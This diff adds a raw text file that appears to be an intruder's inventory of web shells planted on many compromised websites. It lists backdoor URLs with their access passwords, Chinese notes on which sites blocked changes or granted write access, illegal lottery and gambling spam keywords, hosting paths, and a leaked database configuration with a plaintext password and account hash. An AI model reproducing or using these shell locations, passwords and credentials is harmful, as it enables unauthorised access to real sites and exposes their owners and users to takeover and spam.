@@ -1,0 +1,2102 @@
+http://sazhen.com/uploads/o.php
+http://sazhen.com/incllude/dialog/select_admins.php
+http://sazhen.com/incllude/inc/inc_fun_static.php
+http://sazhen.com/incllude/FCKeditor/editor/dialog/dede_config.php
+http://sazhen.com/incllude/payment/wechat.php|x
+
+http://www.guanmeixiangsu.com/e.php
+http://www.guanmeixiangsu.com/install_1565850043/templates/step6.php
+http://www.guanmeixiangsu.com/install_1565850043/templates/s1_sae.php
+http://www.guanmeixiangsu.com/install_1565851046/templates/s1_sae.php
+http://www.guanmeixiangsu.com/install_1565851046/templates/step6.php
+http://www.guanmeixiangsu.com/install_1565851046/eyoucms.php|x
+http://www.guanmeixiangsu.com/data/model/application/admin/model/CustomConfig.php
+
+
+http://52wangjie.com/m/list_user.php
+
+
+
+http://cn-xsj.com.cn/admin/ewebeditor/uploadfile/20200112152119763.asp        LandGrey
+http://cn-xsj.com.cn/admin/Ewebeditor/asp/browse.asp   |a
+http://cn-xsj.com.cn/admin/Ewebeditor/asp/browse.asp   |a
+http://cn-xsj.com.cn/admin/Ewebeditor/asp/download.asp
+http://cn-xsj.com.cn/admin/login/Coment.asp
+http://cn-xsj.com.cn/INC/cn_page.asp
+
+
+
+
+https://www.jsjlzxw.com/templets/default/images/photo/e_m_04.php
+https://www.jsjlzxw.com/dedecms/archives_wap.php
+https://www.jsjlzxw.com/Plugins/apps/default.php
+https://www.jsjlzxw.com/include/dialog_/select_admins.php
+https://www.jsjlzxw.com/include/ckeditor/themes/default/default.php|x
+
+
+
+
+---------------------------------------------
+www.gugenylon.cn/e.php
+
+
+www.sz-ganglong.com/cc.php   404
+   404
+www.jswl5888.com/e.php
+www.hljsgtrz.com/e.php
+
+www8.lincom.cn/e.php        0
+jxjyljg.com/e.php             0
+
+7
+www.centurionsweet.com/e.php
+http://www.centurionsweet.com/application/admin/controller/Upload.php
+http://www.centurionsweet.com/application/admin/controller/Appaction.php
+http://www.centurionsweet.com/application/admin/behavior/ModuleAppAction.php
+http://www.centurionsweet.com/application/admin/behavior/ModuleAction.php
+http://www.centurionsweet.com/application/admin/behavior/ModuleInitAction.php
+
+6
+www.tyshgggs.com/e.php
+http://www.tyshgggs.com/install_1570861704/eyoucms.php|x
+http://www.tyshgggs.com/install_1570861704/templates/s1_sae.php
+
+
+5
+shenzhen.bnzone.com/e.php
+http://shenzhen.bnzone.com/install_1547729047/eyoucms.php
+http://shenzhen.bnzone.com/install_1547729047/templates/s1_sae.php
+http://shenzhen.bnzone.com/install_1547729047/templates/step6.php
+
+
+4
+www.weixincus.com/e.php
+http://www.weixincus.com/install_1575946932/templates/s1_sae.php|x
+http://www.weixincus.com/install_1575946932/templates/step6.php
+http://www.weixincus.com/install_1575946932/eyoucms.php
+
+
+1
+www.good-shine.cn/e.php
+http://good-shine.cn/application/admin/model/Upload.php
+http://good-shine.cn/install_1561356300/templates/s1_sae.php
+http://good-shine.cn/install_1561356300/templates/step6.php
+http://good-shine.cn/install_1561356300/eyoucms.php|x
+
+2
+hlyrjs.cn/e.php
+http://hlyrjs.cn/install_1554797835/templates/s1_sae.php
+http://hlyrjs.cn/install_1554797835/templates/step6.php
+http://hlyrjs.cn/uploads/ueditor/20190322/459896eebc9a4bae7f07299c802ec92e.php
+http://hlyrjs.cn/install_1554797835/eyoucms.php|x
+3
+www.dchen.cn/e.php
+http://www.dchen.cn/install_1561340803/templates/s1_sae.php
+http://www.dchen.cn/install_1561340803/templates/step6.php
+http://www.dchen.cn/install_1561340803/eyoucms.php|x
+
+4
+
+
+
+
+
+
+
+
+
+http://www.tyshgggs.com/e.php
+http://www.tyshgggs.com/application/admin/controller/Upload.php
+http://www.tyshgggs.com/application/admin/behavior/ActionBehavior.php
+http://www.tyshgggs.com/application/admin/model/Upload.php|x
+
+
+---------------------------------------------
+20200109 
+https://www.jsjlzxw.com/xapp/control/admin/action.php              404
+https://www.jsjlzxw.com/data/admin/config_upload.php
+https://www.jsjlzxw.com/data/module/d7facbd1cf9979ae352bb8fe175bc59f.php
+https://www.jsjlzxw.com/data/enums/bodyeducation.php|x
+
+
+www.wufun.net\news\hot\news\2020\0106：注释掉m端
+4
+http://www.siemenswkf.com/application/admin/index.php
+http://www.siemenswkf.com/data/model/application/admin/model/Custom_Config.php
+http://www.siemenswkf.com/data/model/application/common/model/CustomConfig.php
+http://www.siemenswkf.com/data/model/application/home/controller/CustomConfig.php|x
+5  不可跨
+http://www.kunanxiaofang.com/0.php
+http://www.kunanxiaofang.com/install_1562545707/eyoucms.php
+http://www.kunanxiaofang.com/install_1562545707/templates/s1_sae.php
+http://www.kunanxiaofang.com/install_1562545707/templates/step6.php|x
+--------------------------------------------------------------------------------------------------
+shangzhengcj.comNot Found
+82222223.com--
+honglindoor.com三分彩【官网-开奖-走势图-在线计划】
+qunyiwuliu.com必威体育提现要多久
+wxszzc.com瓦房店鑫盛冶金轴承制造有限公司|三类轴承|13785959115|15131347111|15966288333
+hongmujiajv.com红木家具 红木家具价格 新会红木家具厂家-皇贵轩红木家具厂
+bbaecu.com炸金花斗地主棋牌-3013.COM熊猫棋牌官网
+e8hainan.cn婚礼?派
+jnqsbearing.com365足球比分直播_365在线体育直播
+gzthlsw.com无法解析域名。
+jixuntong.com海南吉讯通科技有限公司
+dttysw.com澳洲幸运5官网平台-【首页欢迎您】
+www.shangzhengcj.com餐饮厨房工程_深圳厨房工程_食堂厨房设备工程-深圳商正厨具厂
+lqjyzc.com山东省江禹轴承制造有限公司
+tybearing.net临清市泰永轴承有限公司
+allforlife.cn疯狂赛车-疯狂赛车官网-首页
+lqcdzc.com
+------------------------------------------------------------                  
+6
+http://www.suzhoulitas.com/0.php
+http://www.suzhoulitas.com/extend/index.php
+http://www.suzhoulitas.com/application/admin/controller/Custom_config.php
+http://www.suzhoulitas.com/install_1573810842/templates/s1_sae.php
+http://www.suzhoulitas.com/install_1573810842/templates/step6.php|x
+http://www.suzhoulitas.com/install_1573810842/eyoucms.php
+
+7
+http://yunjianedu.com/0.php
+http://yunjianedu.com/install_1571586310/templates/s1_sae.php
+http://yunjianedu.com/install_1571586310/templates/step6.php|x
+http://yunjianedu.com/install_1571586310/eyoucms.php
+
+8  码子打开 403
+http://wtdysf.com/login.php xuanbao
+http://wtdysf.com/application/lang/zh-en.php
+http://wtdysf.com/htdocs/application/lang/en-us.php
+http://wtdysf.com/application/admin/template/system/index_lg.php
+
+9
+http://www.jienengelectric.com/0day.php
+http://www.jienengelectric.com/install_1546847582/templates/s1_sae.php
+http://www.jienengelectric.com/install_1546847582/eyoucms.php
+http://www.jienengelectric.com/install_1546847582/templates/step6.php|x
+http://www.jienengelectric.com/application/admin/model/Upload.php
+
+10
+http://exstage.com.cn/0day.php
+http://exstage.com.cn/install_1573267902/eyoucms.php
+http://exstage.com.cn/install_1573267902/templates/s1_sae.php
+http://exstage.com.cn/install_1573267902/templates/step6.php
+
+11
+https://qingshihao.com/Uploads/link/2020-01-07/5e139bd45a4c7.php
+https://qingshihao.com/Runtime/Install/install.php
+https://qingshihao.com/Uploads/news/2020-01-04/default.php
+https://qingshihao.com/Tpl/default/Vip/login.php
+https://qingshihao.com/Tpl/default/Home/index.php|x
+
+12
+https://www.hmhuake.com/plugins/test/ly.php
+https://www.hmhuake.com/plugins/identifier/default.php
+https://www.hmhuake.com/plugins/identifier/template/default.php
+https://www.hmhuake.com/plugins/copy/admin_config.php
+https://www.hmhuake.com/static/admin/tpl/system/default.php
+
+
+
+1旁站  广东11选5
+http://guopingtl.yunshunnet.com/
+http://www.cjqlib.com/application/Admin/Controller/MainController.class.php
+http://www.cjqlib.com/application/Admin/Lang/zh-cn/banner.php|x
+http://demo.yunshunnet.com/phpcms/libs/classes/telnets.class.php
+
+-----------------
+www.cjqlib.com                       幸运飞艇计划
+demo3.ysmg0798.com
+----------------------------------
+http://artjdz.com/ly.php
+http://artjdz.com/.well-known/acme-challenge/errorsolution.php  
+http://artjdz.com/.well-known/acme-challenge/error_log.php
+http://artjdz.com/.well-known/default.php|x
+-------------------------------------
+2无目录权限
+http://huaqiongtoys.com/0day.php         
+http://huaqiongtoys.com/default.php
+2、404
+http://www.anhuizq.cn/0day.php
+http://www.anhuizq.cn/install_1578127767/eyoucms.php
+http://www.anhuizq.cn/install_1578127767/templates/s1_sae.php
+http://www.anhuizq.cn/application/admin/Fieldname.php
+http://www.anhuizq.cn/application/admin/model/Upload.php|x
+
+3无目录权限
+http://huaqiongtoys.com/0.php
+http://huaqiongtoys.com/default.php
+
+
+Yuan., [09.01.20 15:28]
+http://www.bjwxzj.com/plugins/test/ly.php
+https://www.hmhuake.com/plugins/test/ly.php
+https://qingshihao.com/Uploads/link/2020-01-07/5e139bd45a4c7.php
+http://www.rmvideos.com/Uploads/ly.php
+http://www.rbphb.com/Uploads/link/2020-01-07/5e139c0a7b433.php
+http://cjqlib.com/ly.php
+
+http://www.cjqlib.com/ly.php
+http://demo3.ysmg0798.com/ly.php
+http://www.sanyamegin.com/0day.php
+http://jtyykj.com/ly.php
+http://www.781036.com/0day.php
+http://www.meiyueduo.com/0day.php
+http://bodpower.com/0day.php
+http://www.syzys.net/0day.php
+http://cztyhy.com/0day.php
+http://exstage.com.cn/0day.php
+http://www.shjiyujx.com/0day.php
+http://skylight-pharm.com/0day.php
+
+http://iot-water.cn/0day.php
+http://www.jisicd.com/0day.php
+http://www.beierdianli.com/0day.php
+http://www.aochengzx.com/0day.php
+http://oulyt.com/0day.php
+http://www.jienengelectric.com/0day.php
+http://wtdysf.com/0day.php
+http://www.newjiayule.com/0day.php
+https://www.cqwzjs.net/0day.php
+
+
+Yuan., [09.01.20 15:28]
+http://www.shuibaxianjiuye.com/0.php
+http://www.suzhoulitas.com/0.php
+http://www.siemenswkf.com/0.php
+http://yunjianedu.com/0.php
+http://www.kunanxiaofang.com/0.php
+http://www.jiachengcg.com/0.php
+
+http://aimetal.cn/0.php
+
+===============================
+
+http://m.dljs.net/templets/xyc.php
+http://m.dljs.net/templets/system/mynews.php|x
+http://m.dljs.net/include/dialog/index.php 生成o.php
+http://m.dljs.net/include/dialog/select_dialogs.php
+http://m.dljs.net/include/dialog/select_dialogs_post.php
+http://m.dljs.net/include/ckeditor/index_pg2.php        o.php
+http://m.dljs.net/include/ckeditor/ckeditor_php3.php
+http://www.fanwen.co/include/default.php|x
+http://www.fanwen.co/gaixie/500zi/index.php
+http://www.fanwen.co/o.php/fanwen.php
+
+
+
+
+0106西藏11选5_西藏11选5开奖结果_西藏11选5基本走势图500万彩票 -首页
+http://www.szkgf.com/function/backup/20190411/o.php
+http://www.szkgf.com/function/ourphp/index_pg1.php
+http://www.szkgf.com/function/ourphp/plugins/modifiercompiler.lower.php
+http://www.szkgf.com/function/ourphp/sysplugins/smarty_internal_config_video.php
+
+http://www.hxywjzp.com/templates/default/cn/o.php    七星彩走势图_七星彩开奖结果历史记录 - 七星彩注册投注官网计划
+http://www.hxywjzp.com/templates/default/default.php
+http://www.hxywjzp.com/templates/default.php
+----------------------------------------====================================++++++++++++++
+
+
+
+
+
+
+01
+
+http://www.bj56cc.com/template_admin/admin/map/list_number.php
+http://www.bj56cc.com/upload/attachment/index.php
+http://www.bj56cc.com/ueditor/dialogs/searchreplace/searchreplace.php
+http://www.bj56cc.com/admin/admin_inc.php
+http://www.bj56cc.com/template_admin/admin/map/s2_sae.php
+http://www.bj56cc.com/template_admin/admin/admin/s1_sae.php|x    西藏
+
+
+02   西藏
+http://lunoluna.com/elll.php  whoami
+http://lunoluna.com/wp-admin/maint/index.php
+http://lunoluna.com/wp-admin/network/plugin-info.php
+http://lunoluna.com/wp-includes/SimplePie/Administrator.php
+http://lunoluna.com/wp-includes/SimplePie/Decode/HTML/Cntities.php|x
+
+lll.php
+
+03西藏
+
+http://www.wanbangqianhe.com/includes/phpqrcode/phpqrcode_inc.php
+https://www.wanbangqianhe.com/includes/fckeditor/fckeditor_php3.php
+https://www.wanbangqianhe.com/includes/fckeditor/editor/filemanager/connectors/php/download.php
+https://www.wanbangqianhe.com/includes/fckeditor/editor/filemanager/connectors/index.php
+https://www.wanbangqianhe.com/includes/fckeditor/editor/filemanager/browser/default/frmfolders.php|x
+
+
+04西藏
+
+http://huoyiche.com/include/ckeditor/ckeditor.config.php
+http://huoyiche.com/include/ckeditor/plugins/autogrow/index.php
+http://huoyiche.com/install/module_admin.php
+http://huoyiche.com/install/module_autos/changyan_autologin.php
+http://huoyiche.com/dede/archives_editor.php|y
+
+http://www.dndhy.com/admsys/admin/bz.qxss.asp  671
+http://www.aaabio.com/about/Copyright.asp
+
+
+
+芝麻代理hsien0812 mima0812
+0104__02
+http://xz.shgoome.com/data/0.php  heiyan   404
+http://jj.shgoome.com/data/0.php  heiyan
+http://cj.shgoome.com/0.php  heiyan
+http://www.swiers.cn/file.php  ..fuck
+http://www.t-acme.com/shelll.php  whoami
+http://www.hkqingchuan.com/shelll.php  whoami
+http://www.wanbangqianhe.cn/shelll.php  whoami
+http://www.minghuajx.com/index1.php  2901  
+http://gaosiji.com/data/cache/listcache/0c/53/b6/0.php  heiyan   404
+http://www.emc.design/file.php  ..fuck
+http://www.wlflysee.com/data/0.php  heiyan
+http://bdlydq.com/data/1.php  671
+http://dian.199530.com/file.php   ..fuck
+http://www.syncflo.com.cn/file.php  ..fuck
+http://95photo.cn/file.php  ..fuck           404
+http://www.ishahe.net/uc_server/yz.php  liqin
+http://www.aaabio.com/flash/bestoflotte04.asp  671    404
+
+http://guchangxiang.com/hanyi.asp  hanyi
+
+福彩三地
+http://www.czmeehan.com/member/usermember.asp
+http://www.czmeehan.com/about/list_1.asp
+http://www.czmeehan.com/gbook/admin_inc.asp
+http://www.czmeehan.com/en/config/%20AspCms_Pay_MentConfig.asp
+http://www.czmeehan.com/en/En_config.asp|a
+
+
+福彩三地
+http://lh.sshdkj.com/admin_aspcms/editor/Upload_config.asp
+http://lh.sshdkj.com/config/AspCms.asp
+http://lh.sshdkj.com/install/lib/cmd5.asp
+http://lh.sshdkj.com/data/backup/index.asp|a
+
+
+
+2
+http://www.huanghaibus.cn/includes/shop1.asp
+http://www.huanghaibus.cn//aspnet_client/system_web/4_0_30319/index.asp
+
+
+http://www\aurinehrb.com\UploadFiles\default.asp  防火墙
+http://www.aurinehrb.com\admin111\Inc\common.asp
+
+1
+www.555jh.com\HCJS\PUB\PUB2s.asp
+www.555jh.com\aspnet_client\system_web\1_1_4322\index.asp
+www.555jh.com\diary\images\DIARY\IMAGES\image.asp
+www.555jh.com\diary\images\DIARY\IMAGES\image.asp|a
+
+
+
+Yuan., [04.01.20 17:41]
+http://www.szmspe.com/templates/default/cn/cn_photo.php admin156
+http://www.szmspe.com/templates/default/en/en_index.php
+http://www.szmspe.com/templates/wap/cn/cn_index.php
+http://www.szmspe.com/aspnet_client/system_web/4_0_30319/index.php
+http://www.szmspe.com/client/user/ourphp_pause.class.php|x
+
+0104  站群
+http://www.hands911.com/languages/en_us/admin/mail_templates.php
+http://www.hands911.com/languages/en_us/convert/shopex49.php
+http://www.hands911.com/install-jk/templates/error_checking_content.php
+http://www.hands911.com/install-jk/includes/lib_admin.php|x
+
+musickkbox.com\includes\lib_command.php
+
+http://musickkbox.com/
+http://shopnet88.com/
+http://yajiushun.com/        \home1\funsixsi\www\yajiushun\
+
+http://www.pcdiy999.com/
+http://wanttonow.com/
+http://www.hands911.com/
+http://dukemmy.com/
+http://www.dukemmy.com/
+
+
+-------------------------------
+justhost.com
+quebrada.net
+asia-art.net
+www.asia-art.net
+wiki.neuromeka.net
+www.hands911.com
+www.appleface.com.tw
+www.co.hillsdale.mi.us
+wanttonow.com           \home1\funsixsi\public_html\wanttonow
+roomsandwords.com
+dukemmy.com              \home1\funsixsi\public_html\dukemmy\
+htgsd.com
+authorjennyschwartz.com
+www.htgsd.com
+www.clivebanks.co.uk
+clivebanks.co.uk
+www.clearenergyhomes.com
+www.queensland100.com
+kamui520.com
+sahasraspirit.com
+apwawaconf.com
+www.frizzkirby.com
+www.irishtype3dna.org
+www.dukemmy.com
+www.clikdate.com
+www.shir-hadash.org
+soccer.21ccea.org
+rbmoviereviews.com
+www.epicesduweb.com
+www.bunburyonline.com
+www.latop100.com
+www.nyny100.com
+www.harmonyrescue.com
+www.mediapsychic.com
+www.chinaweek.net
+www.airwork.com.au
+www.londontop100.co.uk
+epicesduweb.com
+viecom.net
+bodymaster.com
+joeldubin.com
+www.mizzlekorea.com
+www.ruimang.com
+seposlive.net
+enkutin.com
+bellawrites.com
+www.tutast.com
+www.ajratech.com
+exsl.net
+www.funkadvertising.com
+www.engrahaulage.com
+www.indig.com
+www.bederech.com
+www.surfincash.com
+clidesign.com
+www.artbykp.com
+www.paristop100.com
+www.veridian5.com
+veridian5.com
+goldenrockband.com
+www.tipografico.cl
+www.concussed.net
+www.acrefencing.co.uk
+www.mit-consulting.ma
+grilsa.com
+intech-designer.com
+www.blog.athomemums.com
+icirclemedia.com
+oilworld.com
+concussed.net
+mail.clivebanks.co.uk
+albanycivic.org
+oranix.com
+reportfortunes.com
+hocadeo.org
+wordofweb.com.au
+casadeanahn.com
+thehudaway.com
+www.pcdiy999.com
+sharky.com.au
+www.sahasraspirit.com
+gianishop.com
+www.oilworld.com
+www.arvclub.co.uk
+paristop100.com
+=========================
+
+20200101
+www.medkaoyan.net/linianzhenti/zzzt/        幸运飞艇计划
+www.medkaoyan.net/linianzhenti/yyzt/        幸运飞艇计划
+www.medkaoyan.net/linianzhenti/xzzt/        江苏快三计划
+www.medkaoyan.net/linianzhenti/               幸运飞艇计划
+
+0103
+http://www.hands911.com//languages/en_us/convert/shopex45.php
+http://www.hands911.com/admin/includes/inc_user_dump.php
+http://www.hands911.com/admin/templates/bonus_by_print.php
+http://www.hands911.com/data/includes/lib_admin.php
+http://www.hands911.com/data/afficheimg/1384105877312923651.php|x
+
+
+http://www.chjzk.cn/uploadfile/202014465315543.jpg/.php   首页无修改权限
+http://www.chjzk.cn/uploadfile/20091261414152.jpg/.php
+http://www.chjzk.cn/uploadfile/20111122142358373.jpg/.php
+http://www.chjzk.cn/uploadfile/20190123457.jpg/.php|x
+http://www.chjzk.cn/uploadfile/20091291514102.php
+
+
+
+http://www.nj-ices.com/upload/202013543921553.php  admin
+http://www.nj-ices.com/upload/201337165039196.php
+http://www.nj-ices.com/upload/20116221118689498.jpg/.php
+http://www.nj-ices.com/aspnet_client/system_web/4_0_30319/default.jpg
+http://www.nj-ices.com/admin/images/ht_06.asp|a
+
+http://www.gohighdh.com/upload/image/20200103/15780133703746834.jpg/.php  admin
+http://www.gohighdh.com/upload/image/20200103/15780133703746834.php
+http://www.gohighdh.com/upload/image/20160506/14625025031178495.php
+http://www.gohighdh.com/upload/image/20191229/15775887958647276.php
+http://www.gohighdh.com/upload/image/20141013/14131859644323606.php
+http://www.gohighdh.com/upload/image/20160513/14631101325543501.php|x
+
+http://www.yzrbdg.com/System/NewsEdit.php
+http://www.yzrbdg.com/Include/ConnSiteData.php
+http://www.yzrbdg.com/aspnet_client/system_web/4_0_30319/Fieldname.php
+http://www.yzrbdg.com/Upload/DownFiles/download.php
+http://www.yzrbdg.com/Upload/OtherFiles/config_pay_user.php
+http://www.yzrbdg.com/Upload/PicFiles/2015.10.6_8.48.17_7254.php|x
+
+http://www.monicasneaker.top/php.php  angel  
+http://monicasneaker.top/images/includes/index.php admin156         403未授权  forbidden
+           http://www.monicasneaker.top/php.php  angel  
+http://www.monicasneaker.top/sitemap.xml.php
+http://monicasneaker.top/images/includes/index.php
+http://www.monicasneaker.top/includes/functions/function.helper.php
+http://www.monicasneaker.top/includes/functions/functions.helper.php
+http://www.monicasneaker.top/images/index.bak.php
+http://www.monicasneaker.top/images/includes/s1_sae.php|x
+
+
+
+http://www.jxganwang.com/o.php admin156  网盾拦截
+http://www.szkgjz.com/templates/default/cn/cn_about.php admin156   404
+http://www.onehes.com/templates/user/images/logobei.php admin156   
+
+
+
+http://www.hands911.com//languages/en_us/convert/shopex45.php admin156
+http://www.chjzk.cn/uploadfile/202014465315543.jpg/.php admin
+http://www.chjzk.cn/uploadfile/20091291514102.php admin156
+http://www.nj-ices.com/upload/202013543921553.jpg/.php  admin
+http://www.nj-ices.com/upload/201337165039196.php admin156
+http://www.gohighdh.com/upload/image/20200103/15780133703746834.jpg/.php  admin
+http://www.gohighdh.com/upload/image/20200103/15780133703746834.php admin156
+http://www.yzrbdg.com/System/NewsEdit.php admin156
+
+
+
+http://www.hnsx168.com/templets/default/images/title_images.php  671      修改首页被拦截
+http://www.hnsx168.com/include/dialog/select_audio.php
+http://www.hnsx168.com/include/data/words/admin_common.php
+http://www.hnsx168.com/6dadmin/content_a_list.php
+http://www.hnsx168.com/data/textdata/admin_common.php
+http://www.hnsx168.com/data/sessions_a99273799e/sess_8vrp50r7stukf733rfkoumbt73.php|x
+
+=============
+http://www.aodis.com/uploadfile/image/banner/cc.php
+http://www.aodis.com/aspnet_client/system_web/4_0_30319/aspnet_system.php
+http://www.aodis.com/aspnet_client/system_web/4_0_30319/aspnet_system.asp
+http://www.aodis.com/admin/_cmseditor/fckeditor.inc.php
+http://www.aodis.com/admin/_cmseditor/editor/fckeditor.inc.php
+http://www.aodis.com/admin/_cmseditor/editor/filemanager/browser/default/frmresourcetype.php            benet520
+http://www.aodis.com/admin/_cmseditor/editor/filemanager/connectors/asp/config_inc.php|x
+
+
+http://tkguolu999.com/editor/cc.php admin156                                   西藏11选5
+http://tkguolu999.com/editor/dialogs/emotion/emotion.php
+http://tkguolu999.com/editor/dialogs/template/template.php
+http://tkguolu999.com/editor/dialogs/searchreplace/searchreplace.php|y
+http://tkguolu999.com/UploadFiles/2020-01/2/cd_video.php  fuku
+
+http://www.seiburcs.com/janey_ht/class.php   benet520  没修改权限
+http://www.seiburcs.com/uploadfile/202013/2021920153145452108.jpg/.php admin156
+http://www.seiburcs.com/uploadfile/202013/2021920153145452107.jpg/.php
+http://www.seiburcs.com/uploadfile/20141120/201411201631594613376.php
+http://www.seiburcs.com/uploadfile/2019827/20198271357408101672.php
+http://www.seiburcs.com/uploadfile/News/20140409134699909991.php|x
+
+
+http://en.ukiwihealth.com/index.php|a
+http://ukiwihealth.com//index.php|a
+http://geohouse.cn/index.php|a
+==================================
+
+1230
+
+
+https://xwspeak.com/o.php
+https://xwspeak.com/application/admin/controller/Fieldname.php
+https://xwspeak.com/application/admin/conf/md5list.php
+https://xwspeak.com/application/admin/model/Fieldname.php
+https://xwspeak.com/application/admin/logic/Fieldname.php|x
+https://xwspeak.com/template/pc/skin/images/block_images.php
+
+http://leiyang112.top/plugins/weapp/Minipro0002/model/o.php
+http://leiyang112.top/_config/data.ini.php
+
+
+
+
+http://www.hyburk.com/install_1569243554/templates/s1_sae.php
+http://www.hyburk.com/uploads/allimg/20190424/eddea065cf9e908aaf3e8076c7b4ec5c.php
+http://www.hyburk.com/data/schema/ey_images_download.php
+http://www.hyburk.com/data/schema/ey_user.php|x
+
+
+http://www.quxiannews.com/uploads/allimg/20190312/19cd08c0bf0d83c91636b88683239bc6.php
+http://www.quxiannews.com/uploads/allimg/20190312/9a6178a071ed852892fb5f6972053c10.php
+http://www.quxiannews.com/install_1574408465/templates/s1_sae.php
+http://www.quxiannews.com/install_1574408465/templates/s4_sae.php|x
+
+
+
+http://www.pxtmtc.com/plus/indax.php  123
+http://www.zyalc.com/assets/css/fonts/iconfont.php  671
+http://hbhsxws.com/member/inc/pay_tenpay.php  671
+http://www.yibaozhineng.com/mazi.php  752111270000001
+http://www.tjmzy.com/common/WebEditor/upload.php  admin
+http://www.aodis.com/admin/_cmseditor/editor/fckeditor.php  admin
+http://www.chinapadlock.net/ewebeditor/admin/images/lii.php  admin
+http://www.dicadpro.net/download/zjdm.php  7522701
+http://www.china-eae.com/skin/default/image/adword_bg.php  data
+http://www.guochao-tools.com/admin/html/config.php  admin
+http://njthjn.com/admin/kindeditor/attached/file/20191228/20191228173124_4668.doc/.php  admin
+http://www.sh-jinrui.cn/upload/image/20191228/20191228092846_59133.jpg/.php  admin
+http://njgreat.cn/uploadfile/20191228/201912281724156650653.jpg/.php  admin
+http://www.handong369.com/uploads/heiyan.php  heiyan
+http://www.tjghaz.cn/admin/zizhi/upfile/95706.jpg./.php  admin
+http://www.nmbgs.com/UploadFiles/201255105739996.php  abc123
+http://www.wertai.com/flash/cselect_images_gost.php  abc123
+http://www.njky.cn/upload/image/20191228/15775238168248335.jpg./.php  admin
+http://hindustanflowers.com/stagefile/styles/ini.php  SW70209MMX777
+http://flexfpc.com/think/tpl/dispatch_jump.php  data
+http://www.c88808.com/Uploads/2019-12-28/5e0717de38e28.php  xiaozhi2016
+http://feiruitec.com/up/image/20191228/20191228163584528452.jpg/.php  admin
+http://www.wdjrgc.com/xheditor-1.2.2/demos/ckfinder/core/ckfinder.php  heiyan
+http://www.sysxzm.com/upload/2018/05/ligejpg1.jpg/.php  admin
+http://wz.daguiyang.cn/images/js/dropdown.php  671
+http://zzb.boluo.gov.cn/js/368.php  heiyan
+http://www.dbtuoyun.com/member/templets/images/smiley/10_sdfwsrgshr5.php 671
+http://www.zhongmei-plastic.com/Editor_Qndl/ButtonImage/standard/BackColor.php  heiyan
+http://qixingcai1.com/Uploads/2019-12-27/5e05d0c3bebfc.php  xiaozhi2016
+http://www.cnbmwater.com/data/cache/diggCache/mazi.php  752111270000001
+http://dianli.hongkewangluo.com/wang.php  admin
+http://xsyx.org/ueditor/php/upload/image/20190507/fontawesome.asp  c0nn
+http://china-baoshen.com/sys_manager/css/left_css.asp  c0nn
+http://www.tomtech.cn/Admin/images/he/underline.asp  c0nn
+http://lzmhkj.com/admingl/ueditor/themes/default/css/index.asp  c0nn
+http://www.gcjxz.com/gcjxz/css/Collects.asp  c0nn
+http://www.czsbsy.com/templates/green/quanshegd/head.asp  c0nn
+http://www.fhbaoli.com/css/flickerplates.asp  c0nn
+http://lzmhkj.com/admingl/editor/exit.asp  c0nn
+http://www.sdygdl.com.cn/biaoqianimages/bottoms.asp  c0nn
+http://www.chinahxbz.com/custom/optimize-table.asp  K
+http://www.sucau.com/js/slide1.asp  c0nn
+http://www.kuangshai.net/exit.asp  c0nn
+http://www.tyjzbb.com/special/index.asp  ceshi
+http://www.tomtech.cn/Inc/Conn.asp  c0nn
+http://jsyijia.com/public/images/index.asp  c0nn
+http://www.golokakyung.com/js/PCASClass.asp  c0nn
+http://www.xywhblg.com/inc/news/menu/config/menu/cooon.asp  sbp.
+http://www.siitech.cn/templets/default/bak/case.asp  K
+
+
+www.wufun.net\uploads\160630\9-160630153955210wap.php
+
+
+http://hexavpn.com/.5de6f8ec8d83f.php
+http://hexavpn.com/.5de6f8ec8d83f.php#
+
+http://acslight.com/wp-content/uploads/2019/12/.5de6f8ee70bca.php
+http://acslight.com/wp-content/uploads/2019/12/6.php
+http://acslight.com/wp-admin/user/templets.php
+http://acslight.com/wp-admin/includes/class-bulk-theme-upgrader-face.php
+
+
+https://wlc-ks.com/wp-content/uploads/2019/12/.5de6f9126da90.php
+https://wlc-ks.com/wp-content/uploads/2019/12/6.php
+
+
+http://www.fanwen.co/gaixie/500zi/index.php
+http://www.fanwen.co/fanwen.php
+
+http://www.fanwen.co//coco/login.php
+[userid] => coco
+[pwd] => 4acc8ccd228fbb5115f3
+<?php
+$cfg_dbhost = 'localhost';
+$cfg_dbname = 'fanwen';
+$cfg_dbuser = 'fanwen';
+$cfg_dbpwd = 'y2e8b4u7';
+$cfg_dbprefix = 'red_';
+$cfg_db_language = 'gbk';
+
+
+?>
+
+
+1226词：500万彩票
+www.huanaguoji.cc
+http://www.jindeyang3d.com   旁站
+breezysky.net
+http://www.huanaide.com/
+ssc.breezysky.net
+
+http://m.dljs.net//include/dialog/select_admin.php
+http://m.dljs.net/include\ckeditor\config.php
+
+1224
+http://bbdzj.com/static/upload/20191125/php1.php  admin
+http://www.dile.cn/uploadfile/20191224145515ligejpg1.jpg/.php  admin无权限
+http://www.xcepxl.com/Test2684.php  admin
+http://www.kdtys.com/uploadfile/2019122414381136053.jpg/.php  admin无权
+http://www.jyhzx.cn/admin/images/lii.php  admin
+http://www.kmguolv.com/111.php  7522
+http://gxxqgbc.com/include1/tpllib/pluss_b9.jpg.php  gprs1988   404
+http://www.sz-paulroyal.com/MyAccount/php.php  1  404
+http://gxxqgbc.com/include111/tpllib/pluss_b9.jpg.php  gprs1988
+http://szxiaguang.com/commonn.inc.php  xiao1688  404
+http://www.yunhaidahua.com/images/js/dropdown.php  heiyan  网盾
+http://www.yzkisser.com/data/a.asp  ceshi
+http://www.6hyw.com/attachment/information/201912/671.asp   671
+http://www.synergy-tool.com/ceshi.asp  ceshi
+http://tcxproperty.cn/hwz108/ronting.asp  gocn217bobo
+http://www.xingshijy.cn/xljy/css/style.asp  K
+http://www.moxin.me/list/indexa.asp  c0nn  404
+http://lcqpw.com/111.php  7522
+
+1
+http://lcqpw.com/feed/feedbook.php  admin
+http://lcqpw.com/admin/template/database_close.tpl.php
+http://lcqpw.com/brand/bg_inc.config.php
+http://lcqpw.com/admin/image/import.php
+
+2  http://jiba.ckguiau.ph:443/upload/tixian/20191224/df77b30c456b3ff132548ee27f8bb182.php  nima123
+http://jiba.ckguiau.ph:443/upload/tixian/20191219/1667ae0e7787f4f4a916013fa4739c7c.php
+http://jiba.ckguiau.ph:443/upload/tixian/20191218/ae1422d6e4d0ca9b63b81dd577162c08.php
+3被删除
+http://www.jindeyang3d.com/plus/guestbook/images/bottom_cof.php  heiyan
+http://www.jindeyang3d.com/include/ckeditor/themes/default/index.php
+http://www.jindeyang3d.com/templets/default/index_leftmenu.php
+http://www.jindeyang3d.com/hn-jason/apps/CaiJiXia/cjx.delphi.php
+http://www.jindeyang3d.com/templets/system/part_arclistsg.php|y
